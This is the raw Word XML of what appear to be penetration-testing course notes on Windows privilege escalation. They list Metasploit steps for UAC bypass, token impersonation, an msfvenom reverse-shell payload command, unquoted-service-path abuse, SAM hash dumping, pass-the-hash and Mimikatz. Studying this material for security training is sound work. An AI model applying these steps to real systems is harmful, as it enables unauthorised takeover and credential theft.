    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000036E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="5"/>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Verify by running ( post/windows/gather/win_privs)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000036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ab/>
          <w:t xml:space="preserve">→ then run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getsystem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as uac is bypassed</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000037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7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incognito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impersonate other users</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000372">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="71"/>
        </w:numPr>
        <w:spacing w:before="20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list tokens -u </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000037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7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Unquoted Service Paths → when environment paths are unquote with spaces, dropping dll/exe in location can replace intended place </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000375">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="20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via wmic  -- search all path names for unquoted</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000376">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="34"/>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with sc script (service control) to get more information</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000377">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:spacing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with metasploit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trusted_service_path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module</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000037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79">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1482cu8bxa5" w:id="138"/>
        <w:bookmarkEnd w:id="13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(WINDOWS PRIV ESC)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003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handler session</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000037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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000037C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="20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Sysinfo</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000037D">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Getsystem</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000037E">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Getprivs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000037F">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post/windows/gather win_privs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000380">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UAC??</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000381">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exploit/windows/local/bypassuac_injection (with session)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000382">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Show targets</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000383">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PAYLOAD </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000384">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this doesn't work try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third party tools (UACME)</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000385">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Msfvenom -p windows/…. /reverse_Tcp LHOST=IP LPORT=PORT -f exe -o /root/path.exe</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000386">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="107"/>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backdoor and third party tool</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000387">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="107"/>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Clone repository (find compiled tools)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000388">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="107"/>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via meterpreter (both exploit and compiled tools)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000389">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="107"/>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Msf handler for payload</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000038A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="107"/>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tl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000038B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>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KILL ALL SESSIONS</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000038C">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Sessions -k </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000038D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="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Jobs -K </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000038E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:spacing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 create a msfconsole script (rc) , run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msfconsole -r script.rc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creates and uses a handler)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000038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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000390">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="20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sysinfo</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000391">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="72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Google priv esc for operating system</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000392">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="144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for compiler (open shell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execute -f /bin/sh -i -c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interactive, channel io</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000393">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0"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in shell , gcc -v</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000394">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="2160" w:hanging="360"/>
        <w:rPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:eastAsia="Roboto" w:hAnsi="Roboto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="whit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file.c → compile</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000039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96">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4sjj8x525bm" w:id="139"/>
        <w:bookmarkEnd w:id="13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 Unquoted Service Paths)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000039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searched for binarys prior to executing a path. Low priv user in meterpreter</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000398">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="115"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="200" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="72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Shell</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000399">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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Wmic (query service binary paths) , look for unquoted spaces eg. path/name service/ect. (can drop. Name.exe inside instead)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000039A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="115"/>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Wmic service get name,display,pathname,startmode | findstr /i “auto” | findstr /i “c:\windows\\” findstr /i /v “””</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000039B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="115"/>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 for permissions (stop and restart service)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000039C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="115"/>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 stop servicename /start </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000039D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="115"/>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 qc servicename  (who runs the service)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000039E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="115"/>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folder permissions</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000039F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="3"/>
          <w:numId w:val="115"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0"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Icacls “FolderName”</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003A0">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="4"/>
          <w:numId w:val="115"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="360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 → modify</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003A1">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="115"/>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 meterpreter, upload file to relevant directory,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003A2">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="3"/>
          <w:numId w:val="115"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0"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Configure multi handler with same payload, exploit -j</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003A3">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="4"/>
          <w:numId w:val="115"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="360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Start SERVICENAME </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003A4">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="4"/>
          <w:numId w:val="115"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="360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Background shell (cntrlZ) , meterpreter (background)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003A5">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:spacing w:before="200" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="288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NOTE: if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Timeout Error Operation timed ou</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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003A6">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="200" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="360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Multi handler→ set AutoRunScript migrate -n svchost.exe</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003A7">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="360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Start service again</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003A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A9">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42mrmc2xp1ma" w:id="140"/>
        <w:bookmarkEnd w:id="14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Privilege Escalation</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003AA">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Compiling public exploits on local (gcc with architecture of target) or on remote</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003AB">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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credentials</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003AC">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>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processes running permissions .Eg, replace file with msfvenom payload</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003A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dsbq6kscn4c" w:id="141"/>
        <w:bookmarkEnd w:id="141"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003A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dsbq6kscn4c" w:id="141"/>
        <w:bookmarkEnd w:id="14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Maintaining Access</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003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967163" cy="207894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67163" cy="2078946"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect"/>
                      <a:ln/>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003B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B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468697nufda" w:id="142"/>
        <w:bookmarkEnd w:id="14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password </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003B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Dump passwords from the SAM Database</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003B3">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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hashdump → Meterpreter ( need administrator )</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003B4">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="9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Priv_passwd_get_sam_hahses</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003B5">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="91"/>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Migrate to a different process</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003B6">
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
        <w:keepNext w:val="1"/>
        <w:keepLines w:val="1"/>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:spacing w:after="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="720" w:hanging="360"/>
        <w:rPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:rFonts w:ascii="Trebuchet MS" w:cs="Trebuchet MS" w:eastAsia="Trebuchet MS" w:hAnsi="Trebuchet MS"/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_zdwnxj6ecf1o" w:id="143"/>
        <w:bookmarkEnd w:id="14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 THE HASH</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003B7">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:spacing w:before="20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LM and NTLM hashes</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003B8">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:spacing w:before="20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exploit/windows/smb/psexec</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003B9">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:spacing w:before="20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smbpass and user (has to be administrator account)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003BA">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="20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Issues when, use is in the administrators group, not an actual administrator. Can be fixed with registry changes</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003BB">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="116"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0"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Softaw\microsft\windows\currentversion\policies\system</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003BC">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="116"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0"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System\surrentcontrolset\servuces\lanmanserver\parameters  ← PG 106/7 section2/module6</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003BD">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="72"/>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 the hash over RDP, log into remote desptop , use rdp client</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003BE">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="72"/>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Xfreerdp </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003B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C0">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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Mimikatz</w:t>
        </w:r>
      </w:ins>
    </w:p>
